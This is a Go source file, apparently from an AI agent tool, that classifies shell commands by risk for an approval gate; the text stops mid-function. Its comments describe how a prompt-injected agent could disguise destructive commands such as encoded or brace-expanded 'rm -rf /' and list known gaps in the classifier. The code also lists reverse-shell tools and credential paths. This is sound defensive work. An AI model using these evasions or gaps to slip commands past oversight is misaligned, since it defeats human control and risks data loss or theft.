// Package danger classifies shell commands by risk level and provides
// a configurable approval system for dangerous operations.
//
// Classification is token-based (not regex) — it respects quotes, pipes,
// redirects, compound commands (&&, ||, ;), and multi-line input. Each
// command is classified into one of 9 risk classes, and the user can
// configure which actions (allow/prompt/deny) apply to each class.
//
// The gate fails CLOSED. A command whose program name is recognised but
// used benignly classifies as Safe (allow); a command whose verb is NOT
// recognised classifies as Unknown and is denied by default. The set of
// recognised-safe commands (safeCommands) is therefore an explicit
// read-only allowlist — extend it, or the per-profile allowlist, to permit
// a tool rather than relying on it slipping through unclassified.
//
// # Threat model
//
// The classifier is an adversarial filter, not a parser for well-behaved
// input. It assumes a prompt-injected agent is actively trying to make a
// dangerous command read as harmless so it slips past the approval gate.
// The design therefore errs toward the worse class when in doubt, and is
// built in layers that each close a category of evasion:
//
//  1. Normalisation (see normalize) rewrites the command so token-level
//     analysis can see through shell tricks before classification runs:
//     - $'…' ANSI-C escapes        decodeANSIC   ($'\x72\x6d' → rm)
//     - $IFS word-splitting        expandIFS     (rm$IFS-rf$IFS/ → rm -rf /)
//     - {a,b,c} brace expansion    expandBraces  ({rm,-rf,/} → rm -rf /)
//     - $(…)/`…`/<(…)/>(…) subst.  extractSubstitutions (bodies classified too)
//     - command/exec/builtin       stripCommandWrappers
//     - \-escapes (r\m, \rm)       collapseUnquotedBackslashes
//     - absolute paths (/bin/rm)   basenameFirstToken + commandName
//     The tokenizer additionally treats quote boundaries as NON word
//     boundaries, so empty/adjacent quotes like r""m and "rm" still
//     resolve to the single word `rm`.
//
//  2. Structural decomposition. A command is split into segments (on ;,
//     &&, ||), each segment into pipe stages (on |), and EVERY stage is
//     classified — not just the head — so `true | dd of=/dev/sda` and
//     `echo x | sudo rm -rf /home` are seen for what their later stages do.
//     The worst class across all parts wins (see rank).
//
//  3. Wrapper unwrapping (unwrapWrappers). Leading execution wrappers
//     (env, xargs, nohup, nice, setsid, timeout, …) are stripped so the
//     real command underneath is classified; privileged wrappers (sudo,
//     doas, pkexec) additionally impose a system_write floor and then let
//     the inner command escalate further (sudo rm -rf /var → destructive).
//
//  4. Verb-independent resource scanning (classifyResourceToken). Some
//     resources are dangerous regardless of the command touching them:
//     /dev/tcp and /dev/udp pseudo-devices (reverse-shell channels) and
//     sensitive credential paths (~/.ssh, /etc/shadow, ~/.aws/credentials,
//     /proc/self/environ, …). These are flagged wherever they appear.
//
//  5. Payload re-classification. Shell -c strings (bash -c '…') and the
//     bodies of command/process substitutions are themselves classified by
//     re-entering Classify, so nested commands cannot hide a level deeper.
//
// # Limitations
//
// This is a heuristic defence-in-depth layer, NOT a sandbox or a complete
// shell interpreter. It does not, and cannot, catch everything:
//
//   - Variable indirection: `X=rm; $X -rf /` — the value of $X is not
//     tracked. Note the fail-closed default turns this from a silent bypass
//     into a denial: the unrecognised `$X` verb classifies as Unknown.
//   - Fully dynamic construction from runtime data, command output, or
//     environment the classifier cannot evaluate.
//   - Arbitrary value transformations beyond the enumerated encodings
//     (e.g. a secret piped through gzip/openssl before exfiltration).
//   - Interpreter escape hatches we do not special-case (awk 'BEGIN{system()}',
//     editor `!` shells, language-specific eval paths). These read as a known
//     command (awk/vim/…) used benignly, so they classify Safe — the known
//     verb is the gap, not an unknown one.
//
// Because these gaps exist, the classifier is paired with other controls:
// non-interactive denial, output redaction (internal/redact), and — for
// strong isolation — the container sandbox. When tuning, remember that
// over-classification only costs an extra prompt, while under-classification
// can let a destructive or exfiltrating command through silently; prefer the
// former.
package danger

import (
	"fmt"
	"net"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
)

// ── Types ──────────────────────────────────────────────────────────────

// RiskClass represents the risk level of a shell command.
type RiskClass string

const (
	Safe          RiskClass = "safe"
	LocalWrite    RiskClass = "local_write"
	SystemWrite   RiskClass = "system_write"
	Destructive   RiskClass = "destructive"
	NetworkEgress RiskClass = "network_egress"
	CodeExecution RiskClass = "code_execution"
	Install       RiskClass = "install"
	Blocked       RiskClass = "blocked"

	// Unknown is the fall-through class for a command whose program name the
	// classifier does not recognise. It defaults to Deny (same as
	// Destructive): the gate fails CLOSED rather than open, so a novel or
	// obfuscated verb that dodged every known-dangerous check cannot run
	// unprompted. Recognised-but-benign usage classifies as Safe instead.
	Unknown RiskClass = "unknown"
)

// Action represents what to do when a command of a given risk class is detected.
type Action string

const (
	Allow  Action = "allow"
	Prompt Action = "prompt"
	Deny   Action = "deny"
)

// ── Tool Operation ─────────────────────────────────────────────────────

// ToolOperation describes a native tool call for approval checking.
type ToolOperation struct {
	Name     string
	Resource string
	Risk     RiskClass
}

// ── Path-based classification ──────────────────────────────────────────

// ClassifyPath returns a RiskClass for a filesystem path.
// /tmp/*, working directory → local_write; /etc/*, /root/* → system_write;
// /boot/*, /dev/*, /sys/* → destructive; home sensitive dirs → system_write.
func ClassifyPath(path string) RiskClass {
	abs, err := filepath.Abs(path)
	if err != nil {
		return SystemWrite
	}
	abs = filepath.Clean(abs)

	for _, prefix := range []string{"/boot", "/dev", "/proc", "/sys", "/mnt", "/media"} {
		if strings.HasPrefix(abs, prefix) {
			return Destructive
		}
	}

	// Temp directory paths are always local, not system. This handles
	// macOS where temp dirs live under /var/folders/, preventing false
	// SystemWrite classification (matching Linux /tmp behavior).
	// os.TempDir may include a trailing separator on some platforms;
	// Clean normalises it before the prefix check.
	if tmpDir := filepath.Clean(os.TempDir()); abs == tmpDir || strings.HasPrefix(abs, tmpDir+string(filepath.Separator)) {
		return LocalWrite
	}

	for _, prefix := range []string{"/etc", "/root", "/var", "/run", "/lib", "/usr"} {
		if strings.HasPrefix(abs, prefix) {
			return SystemWrite
		}
	}
	home, _ := os.UserHomeDir()
	if home != "" {
		for _, sub := range []string{"/.ssh", "/.config", "/.gnupg", "/.aws", "/.kube",
			"/.docker", "/.gitconfig", "/.env"} {
			if strings.HasPrefix(abs, home+sub) {
				return SystemWrite
			}
		}
	}
	return LocalWrite
}

// ClassifyURL returns a RiskClass for a browser URL.
// Internal IPs → system_write; external → network_egress.
// Uses proper IP parsing (handles decimal, octal, hex, IPv6 compressed,
// short forms like 127.1, and all other representations that browsers
// accept via inet_aton-style parsing) instead of string prefix matching
// which was trivially bypassable.
func ClassifyURL(rawURL string) RiskClass {
	u, err := url.Parse(rawURL)
	if err != nil || u.Scheme == "" || u.Host == "" {
		return NetworkEgress // can't parse — don't block, but will fail at fetch time
	}

	host := u.Hostname()

	// Try as an IP address — uses browser-compatible parsing that handles
	// decimal (127.0.0.1), octal (0177.0.0.1), hex (0x7f000001),
	// mixed (127.0x1), short (127.1), single-integer (2130706433),
	// IPv6 compressed ([::1]), IPv4-mapped IPv6, etc.
	if ip := parseBrowserIP(host); ip != nil {
		if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() {
			return SystemWrite
		}
		if ip.IsUnspecified() {
			return SystemWrite
		}
		return NetworkEgress
	}

	// Hostname-based: check well-known private hostnames
	hostLower := strings.ToLower(host)
	switch hostLower {
	case "localhost", "localhost.localdomain", "localhost6", "localhost6.localdomain6",
		"ip6-localhost", "ip6-loopback":
		return SystemWrite
	}

	// *.local (mDNS) resolves to link-local
	if strings.HasSuffix(hostLower, ".local") {
		return SystemWrite
	}

	// Common cloud metadata endpoints (SSRF targets)
	if hostLower == "169.254.169.254" || hostLower == "[fd00:ec2::254]" ||
		hostLower == "metadata.google.internal" ||
		hostLower == "metadata.internal" ||
		strings.HasSuffix(hostLower, ".internal") {
		return SystemWrite
	}

	// Docker internal hostnames
	if strings.HasSuffix(hostLower, ".docker.internal") {
		return SystemWrite
	}

	return NetworkEgress
}

// parseBrowserIP parses an IP address using the same rules browsers use
// (inet_aton-style), handling representations that Go's net.ParseIP doesn't:
//   - Octal: 0177.0.0.1
//   - Hex:   0x7f000001, 0x0.0x0.0x0.0x0
//   - Integer: 2130706433
//   - Short:  127.1
func parseBrowserIP(host string) net.IP {
	// Try standard parse first (handles IPv6, dotted decimal, etc.)
	if ip := net.ParseIP(host); ip != nil {
		return ip
	}

	// Try inet_aton-style parsing for IPv4 with non-standard representations
	parts := strings.Split(host, ".")
	if len(parts) < 1 || len(parts) > 4 {
		return nil
	}

	var nums []uint32
	for _, p := range parts {
		var val uint64
		var err error
		switch {
		case strings.HasPrefix(p, "0x") || strings.HasPrefix(p, "0X"):
			val, err = strconv.ParseUint(p[2:], 16, 32)
		case strings.HasPrefix(p, "0") && len(p) > 1:
			// Only octal if it starts with 0 and has more digits
			// Single "0" is just decimal zero
			val, err = strconv.ParseUint(p[1:], 8, 32)
		default:
			val, err = strconv.ParseUint(p, 10, 32)
		}
		if err != nil || val > 0xFFFFFFFF {
			return nil
		}
		nums = append(nums, uint32(val))
	}

	switch len(nums) {
	case 1:
		// Single number: full 32-bit address
		return net.IPv4(byte(nums[0]>>24), byte(nums[0]>>16), byte(nums[0]>>8), byte(nums[0]))
	case 2:
		// a.b: a = high byte, b = remaining 24 bits
		return net.IPv4(byte(nums[0]), byte(nums[1]>>16), byte(nums[1]>>8), byte(nums[1]))
	case 3:
		// a.b.c: a, b = high bytes, c = remaining 16 bits
		return net.IPv4(byte(nums[0]), byte(nums[1]), byte(nums[2]>>8), byte(nums[2]))
	case 4:
		return net.IPv4(byte(nums[0]), byte(nums[1]), byte(nums[2]), byte(nums[3]))
	}
	return nil
}

// ── Config ─────────────────────────────────────────────────────────────

// DangerousConfig defines how dangerous operations are handled.
// Configurable via the standard 4-layer odek config chain.
//
// Default behavior per class (no sandbox):
//
//	safe → allow, local_write → allow, system_write → prompt,
//	destructive → deny, network_egress → prompt,
//	code_execution → prompt, install → prompt, blocked → deny,
//	unknown → deny
//
// The classifier fails closed: a command whose program name is not
// recognised classifies as Unknown and is denied by default. Set
// "unknown": "prompt" (or add trusted tools to the allowlist) to soften
// this for a given profile.
type DangerousConfig struct {
	// Classes maps risk classes to their configured action.
	// Only overrides for non-default values need to be set.
	Classes map[RiskClass]Action `json:"classes,omitempty"`

	// Allowlist is a list of command strings that are always allowed,
	// regardless of their risk classification. Exact match only.
	// Takes priority over Denylist.
	Allowlist []string `json:"allowlist,omitempty"`

	// Denylist is a list of command strings that are always denied,
	// regardless of their risk classification. Prefix match (after trimming).
	Denylist []string `json:"denylist,omitempty"`

	// DefaultAction is the global default action applied to ALL risk classes
	// when set. Per-class overrides in Classes still win.
	// "allow" → YOLO mode (everything runs without prompt)
	// "deny" → lockdown (everything denied unless explicitly allowed)
	// Not set → uses built-in defaults per class
	DefaultAction *string `json:"action,omitempty"`

	// NonInteractive specifies what to do when running without a TTY.
	// "allow" (default) — run everything, "deny" — block all prompted ops.
	NonInteractive *string `json:"non_interactive,omitempty"`

	// Approver handles interactive approval prompts for dangerous operations.
	// When set, all Prompt-class operations use this instead of /dev/tty.
	// Tools can inject their own approver (e.g., WebSocket-based for odek serve).
	// When nil, CheckOperation falls back to /dev/tty (CLI-compatible default).
	Approver Approver `json:"-"`
}

// defaultActions defines the base per-class behavior.
var defaultActions = map[RiskClass]Action{
	Safe:          Allow,
	LocalWrite:    Allow,
	SystemWrite:   Prompt,
	Destructive:   Deny,
	NetworkEgress: Prompt,
	CodeExecution: Prompt,
	Install:       Prompt,
	Blocked:       Deny,
	// Unrecognised commands fail closed — denied by default, like
	// Destructive. Override per-profile (e.g. "unknown": "prompt") or via
	// the allowlist for tools you trust.
	Unknown: Deny,
}

// ActionFor returns the configured action for the given risk class.
// Per-class overrides in Classes win first, then the global default
// action (the "action" field), then built-in defaults, then Prompt.
func (c *DangerousConfig) ActionFor(cls RiskClass) Action {
	// If the user explicitly configured an action for this class, use it.
	if c.Classes != nil {
		if a, ok := c.Classes[cls]; ok {
			return a
		}
	}
	// Blocked is always denied regardless of global default action.
	// This covers commands like "rm -rf /" that are hardcoded as
	// unrecoverable even in YOLO mode.
	if cls == Blocked {
		return Deny
	}
	// Global default action overrides all built-in defaults.
	// Set "action": "allow" for YOLO mode, "action": "deny" for lockdown.
	if c.DefaultAction != nil {
		return parseAction(*c.DefaultAction)
	}
	// Fallback to built-in defaults
	if a, ok := defaultActions[cls]; ok {
		return a
	}
	return Prompt
}

// ActionForCommand returns the action for a specific command string.
// Allowlist and denylist are checked first (exact match for allowlist,
// prefix match for denylist), then falls back to the risk-class-based action.
func (c *DangerousConfig) ActionForCommand(cmd string) Action {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return Allow
	}
	// Allowlist has highest priority — exact match after trimming both sides.
	for _, pattern := range c.Allowlist {
		if cmd == strings.TrimSpace(pattern) {
			return Allow
		}
	}
	// Denylist is checked before classification — prefix match after trimming.
	for _, pattern := range c.Denylist {
		if strings.HasPrefix(cmd, strings.TrimSpace(pattern)) {
			return Deny
		}
	}
	// Classify and use class-based action
	cls := Classify(cmd)
	return c.ActionFor(cls)
}

// NonInteractiveAction returns the action to use when no TTY is available.
func (c *DangerousConfig) NonInteractiveAction() Action {
	if c.NonInteractive != nil {
		return parseAction(*c.NonInteractive)
	}
	return Allow
}

// CheckOperation checks whether a tool operation is allowed, denied,
// or needs approval. Returns nil on allow, error on deny, and prompts
// the user on prompt. Uses the configured Approver when set; falls back
// to /dev/tty (TTYApprover) when no approver is configured.
func (c *DangerousConfig) CheckOperation(op ToolOperation, trustedClasses map[RiskClass]bool) error {
	action := c.ActionFor(op.Risk)
	switch action {
	case Allow:
		return nil
	case Deny:
		return fmt.Errorf("operation denied by configuration: %s %s (risk: %s)",
			op.Name, op.Resource, op.Risk)
	case Prompt:
		// Use configured approver, or fall back to TTY
		approver := c.Approver
		if approver == nil {
			approver = NewTTYApprover(c)
		}
		// Build a TTYApprover for trustedClasses tracking if needed
		if tty, ok := approver.(*TTYApprover); ok && trustedClasses != nil {
			tty.TrustedClasses = trustedClasses
		}
		return approver.PromptOperation(op)
	default:
		return nil
	}
}

func parseAction(s string) Action {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "allow":
		return Allow
	case "deny":
		return Deny
	default:
		return Prompt
	}
}

// ── Tokenizer ──────────────────────────────────────────────────────────

// tokenize splits a shell command into tokens, respecting:
//   - Single and double quotes (content preserved as-is)
//   - Pipes (|), redirects (>, >>), compound (&&, ||, ;)
//   - Newlines mapped to semicolons (command separators)
//
// Output: flattened token slice including operators as tokens.
func tokenize(input string) []string {
	input = strings.TrimSpace(input)
	if input == "" {
		return nil
	}

	// Normalize newlines to semicolons
	input = strings.NewReplacer("\r\n", ";", "\n", ";", "\r", ";").Replace(input)

	var tokens []string
	var current strings.Builder
	inSingle := false
	inDouble := false
	escapeNext := false

	flush := func() {
		if current.Len() > 0 {
			tokens = append(tokens, current.String())
			current.Reset()
		}
	}

	for i := 0; i < len(input); i++ {
		ch := input[i]

		if escapeNext {
			current.WriteByte(ch)
			escapeNext = false
			continue
		}

		if ch == '\\' && inDouble {
			// In double quotes, \ escapes \, ", $, `, and newline
			next := i + 1
			if next < len(input) {
				switch input[next] {
				case '\\', '"', '$', '`':
					escapeNext = true
					continue
				case '\n':
					i++ // skip newline
					continue
				}
			}
			current.WriteByte(ch)
			continue
		}

		if ch == '\'' && !inDouble {
			// Toggle quote state WITHOUT flushing. A quote boundary is not a
			// word boundary in a shell: r''m and "rm" both denote the single
			// word `rm`. Flushing here split them into r,m — letting an
			// attacker hide a command name from prefix matching. Words are
			// only broken on unquoted whitespace/operators (handled below).
			inSingle = !inSingle
			continue
		}

		if ch == '"' && !inSingle {
			inDouble = !inDouble
			continue
		}

		if inSingle || inDouble {
			current.WriteByte(ch)
			continue
		}

		// Outside quotes — handle operators and whitespace
		if ch == ' ' || ch == '\t' {
			flush()
			continue
		}

		// Multi-char operators: &&, ||, >>
		// Check for two-character operators
		if i+1 < len(input) {
			op2 := string(input[i]) + string(input[i+1])
			switch op2 {
			case "&&", "||", ">>":
				flush()
				tokens = append(tokens, op2)
				i++
				continue
			}
		}

		// Single-char operators: |, >, ;
		switch ch {
		case '|', '>', ';':
			flush()
			tokens = append(tokens, string(ch))
			continue
		}

		// Regular character
		current.WriteByte(ch)
	}

	flush()
	return tokens
}

// ── Safe command prefixes ──────────────────────────────────────────────
// (Unused — classification falls through to Safe by default. Kept as
// documentation of what's considered read-only.)

var writePrefixes = map[string]bool{
	"echo": true, "sed": true, "awk": true, "tee": true,
	"rm": true, "mv": true, "cp": true, "touch": true,
	"mkdir": true, "rmdir": true, "chmod": true, "chown": true,
}

var systemPrefixes = map[string]bool{
	"sudo": true, "apt": true, "apt-get": true, "yum": true,
	"brew": true, "dpkg": true, "systemctl": true, "service": true,
	"useradd": true, "groupadd": true, "passwd": true, "chown": true,
}

var destructivePrefixes = map[string]bool{
	"dd": true, "mkfs": true, "mkfs.ext4": true, "mkfs.ext3": true,
	"mkfs.xfs": true, "fdisk": true, "parted": true, "mke2fs": true,
}

var networkPrefixes = map[string]bool{
	"curl": true, "wget": true, "scp": true, "rsync": true,
	"nc": true, "ncat": true, "ssh": true, "sftp": true,
	"ftp": true, "tftp": true, "telnet": true, "git": true,
	// reverse-shell / tunnelling relays
	"socat": true, "rclone": true,
	// DNS lookups double as exfiltration channels
	"dig": true, "nslookup": true, "host": true, "drill": true,
	// other downloaders
	"aria2c": true, "axel": true, "httpie": true,
}

var pipedShells = map[string]bool{
	"sh": true, "bash": true, "zsh": true, "fish": true, "dash": true, "ksh": true,
}

var codeEvalPrefixes = map[string]bool{
	"eval": true, "node": true, "python": true, "python3": true,
	"perl": true, "ruby": true, "php": true,
}

// remoteRunPrefixes fetch and execute a (possibly remote) package or script
// in one shot — code execution, not a plain install.
var remoteRunPrefixes = map[string]bool{
	"npx": true, "bunx": true, "uvx": true, "pipx": true,
}

var installPrefixes = map[string]bool{
	"npm": true, "pip": true, "pip3": true, "gem": true,
	"cargo": true, "brew": true, "go": true,
	"pnpm": true, "yarn": true, "bun": true, "apk": true,
}

// safeCommands are read-only / no-op programs that inspect state or
// transform stdin→stdout without touching the filesystem, network, or
// privileges. They classify as Safe (allow) so ordinary inspection keeps
// working under the fail-closed default. A command here that is given a
// write redirect or a system/sensitive path is still escalated by the
// LocalWrite / SystemWrite / resource-scan checks before this set is
// consulted — so adding a tool here cannot make `cmd > /etc/x` allowed.
//
// Only genuinely non-mutating tools belong here: anything that writes
// files, mutates system state, opens the network, or executes arbitrary
// code must NOT be added (it would become silently allowed).
var safeCommands = map[string]bool{
	// listing / reading files
	"ls": true, "ll": true, "dir": true, "vdir": true, "cat": true, "tac": true,
	"head": true, "tail": true, "less": true, "more": true, "bat": true,
	"nl": true, "wc": true, "file": true, "stat": true, "readlink": true,
	"realpath": true, "basename": true, "dirname": true, "tree": true,
	"du": true, "df": true, "find": true, "locate": true, "mdfind": true,
	// text transforms (stdin→stdout; a > redirect escalates to LocalWrite)
	"grep": true, "egrep": true, "fgrep": true, "rg": true, "ag": true, "ack": true,
	"sort": true, "uniq": true, "cut": true, "paste": true, "column": true,
	"fold": true, "comm": true, "join": true, "look": true, "tr": true,
	"expand": true, "unexpand": true, "fmt": true, "pr": true, "rev": true,
	"diff": true, "cmp": true, "sdiff": true, "colordiff": true, "diffstat": true,
	"jq": true, "yq": true, "xmllint": true, "csvlook": true,
	// hashing / encoding (read-only inspection)
	"strings": true, "od": true, "hexdump": true, "xxd": true,
	"base32": true, "md5sum": true, "sha1sum": true, "sha256sum": true,
	"sha512sum": true, "cksum": true, "b2sum": true, "sum": true, "shasum": true,
	// system / process inspection
	"pwd": true, "printf": true, "date": true, "cal": true, "uptime": true,
	"uname": true, "arch": true, "hostname": true, "nproc": true, "free": true,
	"vmstat": true, "iostat": true, "mpstat": true, "lscpu": true, "lsblk": true,
	"lsmem": true, "lsusb": true, "lspci": true, "lsof": true, "dmesg": true,
	"id": true, "whoami": true, "groups": true, "users": true, "who": true,
	"w": true, "last": true, "getent": true, "ps": true, "pgrep": true,
	"pidof": true, "netstat": true, "ss": true, "printenv": true, "locale": true,
	"getconf": true, "which": true, "whereis": true, "type": true, "hash": true,
	// control / no-op builtins
	"true": true, "false": true, ":": true, "test": true, "[": true,
	"sleep": true, "seq": true, "yes": true, "expr": true, "echo": true,
	"man": true, "info": true, "tldr": true, "help": true, "clear": true,
	// benign shell builtins (navigation, var/job control; no FS/net/priv).
	// NOTE: eval/source/. are deliberately absent — they execute code and
	// are handled as code_execution.
	"cd": true, "pushd": true, "popd": true, "dirs": true, "export": true,
	"unset": true, "set": true, "read": true, "wait": true, "shift": true,
	"return": true, "exit": true, "trap": true, "umask": true, "getopts": true,
	"local": true, "declare": true, "typeset": true, "readonly": true,
	"alias": true, "unalias": true, "jobs": true, "bg": true, "fg": true,
	"disown": true, "let": true, "ulimit": true, "times": true,
	// common modern read-only CLIs (ls/find/cat/ps/df/du/diff/hex viewers)
	"fd": true, "fdfind": true, "eza": true, "exa": true, "lsd": true,
	"htop": true, "btop": true, "glances": true, "pstree": true, "procs": true,
	"duf": true, "dust": true, "delta": true, "hexyl": true, "glow": true,
}

// ── Classifier ─────────────────────────────────────────────────────────

// Classify determines the risk class of a shell command using token-level
// heuristics. Returns the highest-severity class detected.
//
// Priority (highest to lowest):
// blocked > destructive > system_write > code_execution > network_egress >
// install > local_write > safe
//
// Pipeline (see the package doc for the full evasion model):
//
//	raw cmd ─▶ isRawBlocked ─▶ normalize ─┬─▶ classifyOne(main) ─┐
//	                                       └─▶ Classify(sub) ⟳ ───┴─▶ worst wins
//
// normalize neutralises shell evasion tricks (ANSI-C/$IFS/brace expansion,
// $(…)/`…`/<(…) substitutions, command/exec wrappers, backslash escapes,
// absolute-path basenames) and returns the rewritten command plus any
// substitution bodies. classifyOne then splits into segments and pipe stages
// and classifies each (see classifyPipeline/classifyStage). Every extracted
// sub-expression is re-classified through Classify so nested commands cannot
// hide one level deeper; the worst class across the whole tree is returned.
func Classify(cmd string) RiskClass {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return Safe
	}

	// Check blocked patterns on raw command (before tokenization mangles them)
	if isRawBlocked(cmd) {
		return Blocked
	}

	main, subs := normalize(cmd)
	worst := classifyOne(main)
	for _, s := range subs {
		// Substitutions are themselves commands the shell will run.
		// Re-enter Classify (not classifyOne) so nested substitutions
		// inside them also normalise.
		if r := Classify(s); Rank(r) > Rank(worst) {
			worst = r
		}
	}
	return worst
}

// classifyOne runs the existing token-level pipeline against an already-
// normalised command string.
func classifyOne(cmd string) RiskClass {
	tokens := tokenize(cmd)
	if len(tokens) == 0 {
		return Safe
	}

	segments := splitSegments(tokens)

	worst := Safe
	for _, seg := range segments {
		cls := classifyPipeline(seg)
		if Rank(cls) > Rank(worst) {
			worst = cls
		}
	}
	return worst
}

// classifyPipeline classifies one command segment that may contain pipes.
// Each pipe stage is classified independently — so `true | dd of=/dev/sda`
// is seen as the dd, not just the harmless `true` at the head — and a stage
// that pipes INTO a shell interpreter is treated as code execution
// (`curl … | bash`). The worst stage wins.
func classifyPipeline(tokens []string) RiskClass {
	stages := splitPipes(tokens)
	worst := Safe
	for idx, stage := range stages {
		// idx > 0 means this stage receives piped input from the previous one.
		worst = worstOf(worst, classifyStage(stage, idx > 0))
	}
	return worst
}

// classifyStage classifies a single pipe stage. It first strips leading
// execution wrappers (sudo/env/xargs/nohup/timeout/…) so the real command
// underneath is the one classified, while privileged wrappers still set a
// system_write floor. It then escalates for shell `-c` payloads, `find
// -exec`, and any reverse-shell or sensitive-resource tokens in the stage.
// pipedInto reports whether the stage's stdin comes from an upstream pipe, in
// which case feeding it to a shell interpreter is code execution.
func classifyStage(tokens []string, pipedInto bool) RiskClass {
	if len(tokens) == 0 {
		return Safe
	}
	cmdTokens, floor := unwrapWrappers(tokens)
	cls := floor
	if len(cmdTokens) > 0 {
		cls = worstOf(cls, classifyCommand(cmdTokens))

		name := commandName(cmdTokens[0])
		// A shell interpreter that executes code: piped-in data (`… | bash`),
		// a -c payload, a script file, or a process substitution `<(curl …)`.
		if pipedShells[name] {
			if pipedInto {
				cls = worstOf(cls, CodeExecution)
			}
			if arg := flagArg(cmdTokens, "-c"); arg != "" {
				cls = worstOf(cls, CodeExecution)
				cls = worstOf(cls, Classify(arg))
			} else if shellHasOperand(cmdTokens) {
				cls = worstOf(cls, CodeExecution)
			}
		}
		// find … -exec/-execdir/-ok CMD runs an arbitrary command per match.
		if name == "find" && hasAny(cmdTokens, "-exec", "-execdir", "-ok", "-okdir") {
			cls = worstOf(cls, CodeExecution)
		}
	}
	// Reverse-shell channels and sensitive resources can appear anywhere in
	// the stage (including behind redirects we don't fully parse).
	for _, t := range tokens {
		cls = worstOf(cls, classifyResourceToken(t))
	}
	return cls
}

// ── Normalisation (evasion neutralisation) ────────────────────────────
//
// normalize returns the command rewritten so the token-level pipeline can
// see through common evasion tricks, plus a list of additional commands
// that were extracted from $(...) / `...` substitutions. Each substitution
// is the body the shell would itself execute, so it must be classified in
// its own right.
//
// The transformations are intentionally conservative: each one matches a
// shell behaviour that is well-defined and not affected by the surrounding
// quoting style we already track.
func normalize(cmd string) (string, []string) {
	cmd = decodeANSIC(cmd)
	cmd = expandIFS(cmd)
	cmd = expandBraces(cmd)
	cmd, subs := extractSubstitutions(cmd)
	cmd = stripCommandWrappers(cmd)
	cmd = collapseUnquotedBackslashes(cmd)
	cmd = basenameFirstToken(cmd)
	return cmd, subs
}

// decodeANSIC rewrites $'...' ANSI-C quoted strings to their literal value,
// so `$'\x72\x6d' -rf /` and `$'\162m'` reduce to `rm`. Without this an
// attacker hides a command name in hex/octal escapes the tokenizer can't see.
// Only the common escapes are decoded; anything unrecognised is left as-is.
func decodeANSIC(cmd string) string {
	var out strings.Builder
	for i := 0; i < len(cmd); {
		if i+1 < len(cmd) && cmd[i] == '$' && cmd[i+1] == '\'' {
			j := i + 2
			var body strings.Builder
			for j < len(cmd) && cmd[j] != '\'' {
				if cmd[j] == '\\' && j+1 < len(cmd) {
					n := decodeEscape(cmd[j:], &body)
					j += n
					continue
				}
				body.WriteByte(cmd[j])
				j++
			}
			if j < len(cmd) { // closing quote found
				out.WriteString(body.String())
				i = j + 1
				continue
			}
		}
		out.WriteByte(cmd[i])
		i++
	}
	return out.String()
}

// decodeEscape decodes one backslash escape at the start of s into b and
// returns how many bytes of s were consumed.
func decodeEscape(s string, b *strings.Builder) int {
	if len(s) < 2 {
		b.WriteByte('\\')
		return 1
	}
	switch s[1] {
	case 'n':
		b.WriteByte('\n')
		return 2
	case 't':
		b.WriteByte('\t')
		return 2
	case 'r':
		b.WriteByte('\r')
		return 2
	case '\\', '\'', '"':
		b.WriteByte(s[1])
		return 2
	case 'x': // \xHH
		if len(s) >= 4 {
			if v, err := strconv.ParseUint(s[2:4], 16, 8); err == nil {
				b.WriteByte(byte(v))
				return 4
			}
		}
	default:
		if s[1] >= '0' && s[1] <= '7' { // \NNN octal (1–3 digits, like bash)
			// end starts after the backslash+first digit; cap at end<4 so at
			// most 3 octal digits (s[1:4]) are consumed. A wider bound would
			// swallow a following literal octal digit and diverge from the
			// shell (bash: $'\1551' → "m1", not one byte).
			end := 2
			for end < len(s) && end < 4 && s[end] >= '0' && s[end] <= '7' {
				end++
			}
			if v, err := strconv.ParseUint(s[1:end], 8, 16); err == nil {
				b.WriteByte(byte(v)) // bash takes octal escapes mod 256
				return end
			}
		}
	}
	b.WriteByte(s[1])
	return 2
}

// expandBraces approximates brace expansion for the classifier: a {a,b,c}
// group is rewritten to space-separated alternatives, so the evasion
// `{rm,-rf,/}` (which the shell runs as `rm -rf /`) is seen as those words.
// Only comma-bearing groups are touched, leaving ${VAR} and find's {} alone.
var reBraceGroup = regexp.MustCompile(`\{[^{}]*,[^{}]*\}`)

func expandBraces(cmd string) string {
	return reBraceGroup.ReplaceAllStringFunc(cmd, func(m string) string {
		inner := m[1 : len(m)-1]
		return " " + strings.ReplaceAll(inner, ",", " ") + " "
	})
}

// expandIFS replaces $IFS / ${IFS} with a literal space. The shell expands
// $IFS to its default value (space/tab/newline) on word splitting, so
// `rm$IFS-rf$IFS/` runs as `rm -rf /`. We only expand IFS — other env
// vars may legitimately hold arbitrary values and replacing them blindly
// would create false negatives.
var reIFS = regexp.MustCompile(`\$\{IFS\}|\$IFS\b`)

func expandIFS(cmd string) string {
	return reIFS.ReplaceAllString(cmd, " ")
}

// extractSubstitutions pulls out $(...) and `...` substitutions and
// replaces each with a single safe placeholder token. The extracted
// bodies are returned as additional commands to classify.
//
// $(...) handling tracks nesting so $(echo $(echo rm)) extracts both the
// inner and outer bodies. Backticks do not nest in POSIX shells, so we
// just pair the next two unescaped backticks.
func extractSubstitutions(cmd string) (string, []string) {
	var out strings.Builder
	var subs []string

	i := 0
	for i < len(cmd) {
		// Skip over single-quoted spans — substitutions inside ' ... '
		// do not expand in real shells either.
		if cmd[i] == '\'' {
			j := strings.IndexByte(cmd[i+1:], '\'')
			if j < 0 {
				out.WriteString(cmd[i:])
				return out.String(), subs
			}
			out.WriteString(cmd[i : i+1+j+1])
			i += 1 + j + 1
			continue
		}

		// $(...) command substitution and <(...) / >(...) process
		// substitution all run their body as a command. Treat them alike.
		if i+1 < len(cmd) && (cmd[i] == '$' || cmd[i] == '<' || cmd[i] == '>') && cmd[i+1] == '(' {
			depth := 1
			j := i + 2
			for j < len(cmd) && depth > 0 {
				switch cmd[j] {
				case '(':
					depth++
					j++
				case ')':
					depth--
					if depth == 0 {
						break
					}
					j++
				default:
					j++
				}
			}
			if depth == 0 && j < len(cmd) {
				body := cmd[i+2 : j]
				subs = append(subs, body)
				out.WriteByte(' ')
				out.WriteString(substValue(body))
				out.WriteByte(' ')
				i = j + 1
				continue
			}
			// Unterminated — fall through and write literally.
		}

		// `...` — non-nesting.
		if cmd[i] == '`' {
			end := -1
			for k := i + 1; k < len(cmd); k++ {
